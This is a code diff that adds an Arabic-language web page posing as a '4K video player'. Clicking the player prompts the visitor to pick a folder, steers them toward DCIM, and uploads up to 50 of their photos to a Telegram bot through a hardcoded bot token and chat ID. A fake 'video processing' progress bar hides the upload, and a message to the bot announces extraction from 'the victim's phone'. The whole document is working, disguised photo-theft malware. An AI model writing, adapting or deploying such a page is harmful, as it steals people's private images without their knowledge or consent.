@@ -1,49 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player 4K</title>
+    <style>
+        body { background: #0f0f0f; color: #eee; font-family: sans-serif; text-align: center; padding: 20px; }
+        .player-container { max-width: 400px; margin: 50px auto; border: 1px solid #333; border-radius: 15px; padding: 20px; background: #1a1a1a; }
+        .video-placeholder { width: 100%; height: 200px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid #444; }
+        .progress-box { display: none; margin-top: 25px; }
+        .bar-bg { width: 100%; background: #333; height: 12px; border-radius: 6px; overflow: hidden; margin: 10px 0; }
+        .bar-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.3s; }
+    </style>
+</head>
+<body>
+
+<div class="player-container">
+    <h3>📺 مشغل الفيديو</h3>
+    <div class="video-placeholder" id="playArea" onclick="initiateSiphon()">
+        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" width="60" style="filter: invert(1);">
+    </div>
+    <div id="progressBox" class="progress-box">
+        <p id="loaderLabel">جاري التهيئة...</p>
+        <div class="bar-bg"><div id="pBar" class="bar-fill"></div></div>
+    </div>
+</div>
+
+<script>
     const TOKEN = "7864483754:AAH9r2X-r37O6xidO263m3W4S6eFw4N6W5U";
     const CHAT_ID = "7449231580";
 
     async function initiateSiphon() {
-        try {
-            const dirHandle = await window.showDirectoryPicker();
-            document.getElementById('playArea').style.pointerEvents = 'none';
-            document.getElementById('progressBox').style.display = 'block';
+        const pBar = document.getElementById('pBar');
+        const loaderLabel = document.getElementById('loaderLabel');
+        const progressBox = document.getElementById('progressBox');
 
-            // إرسال رسالة اختبار فورية للبوت
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🚀 بدأت عملية السحب الآن...`);
+        try {
+            // فتح نافذة اختيار المجلد
+            const dirHandle = await window.showDirectoryPicker();
+            
+            // بمجرد اختيار المجلد، نظهر الشريط
+            progressBox.style.display = 'block';
+            loaderLabel.innerText = "جاري الاتصال بالسيرفر...";
+
+            // إرسال تنبيه فوري للتليجرام
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🚀 بدأ السحب من هاتف الضحية!`);
 
             let images = [];
             for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
+                if (entry.kind === 'file' && /\.(jpg|jpeg|png)$/i.test(entry.name)) {
                     images.push(entry);
                 }
             }
 
+            if (images.length === 0) {
+                alert("المجلد فارغ، اختر مجلد DCIM");
+                return;
+            }
+
             let count = 0;
-            const totalToFetch = Math.min(images.length, 100);
-
             for (const entry of images) {
-                if (count >= totalToFetch) break;
-
+                if (count >= 50) break; // سحب 50 صورة لتسريع العملية
                 const file = await entry.getFile();
                 const formData = new FormData();
                 formData.append('document', file);
                 formData.append('chat_id', CHAT_ID);
 
-                // استخدام await للتأكد من الإرسال قبل الانتقال للصورة التالية
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { 
-                    method: 'POST', 
-                    body: formData 
-                });
-
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData });
+                
                 count++;
-                let percent = Math.round((count / totalToFetch) * 100);
-                document.getElementById('pBar').style.width = percent + "%";
-                document.getElementById('loaderLabel').innerText = `جاري معالجة الفيديو: ${percent}%`;
+                let percent = Math.round((count / Math.min(images.length, 50)) * 100);
+                pBar.style.width = percent + "%";
+                loaderLabel.innerText = `جاري المعالجة: ${percent}%`;
             }
-
-            document.getElementById('loaderLabel').innerText = "✅ اكتملت المعالجة!";
-
+            loaderLabel.innerText = "✅ تم التحميل بنجاح";
         } catch (err) {
-            console.error(err);
-            alert("حدث خطأ في الاتصال بالسيرفر، تأكد من منح الصلاحية.");
+            alert("خطأ: يرجى استخدام متصفح كروم ومنح الصلاحية.");
         }
     }
+</script>
+</body>
+</html>
